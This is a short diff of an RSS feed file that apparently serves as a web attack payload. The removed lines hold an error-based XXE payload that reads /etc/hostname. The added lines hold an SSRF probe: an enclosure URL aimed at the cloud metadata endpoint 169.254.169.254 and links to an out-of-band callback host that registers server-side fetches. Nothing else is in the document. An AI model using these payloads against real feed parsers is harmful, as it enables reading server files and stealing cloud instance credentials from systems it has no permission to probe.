@@ -1,12 +1,13 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE rss [
-  <!ENTITY % file SYSTEM "file:///etc/hostname">
-  <!ENTITY % error "<!ENTITY &#x25; report SYSTEM 'file:///no-such-file/%file;'>">
-  %error;
-]>
-<rss version="2.0">
+<rss version="2.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd">
   <channel>
-    <title>Checking Errors</title>
-    <item><title>Test</title></item>
+    <title>SSRF Investigation</title>
+    <link>http://qpjv11u6uav34n4vaidajwbl8ce32zqo.oastify.com/web</link>
+    <language>en-us</language>
+    <item>
+      <title>Episode 1</title>
+      <enclosure url="http://169.254.169.254/latest/meta-data/" length="1024" type="audio/mpeg"/>
+      <itunes:image href="http://qpjv11u6uav34n4vaidajwbl8ce32zqo.oastify.com/image.jpg"/>
+    </item>
   </channel>
 </rss>
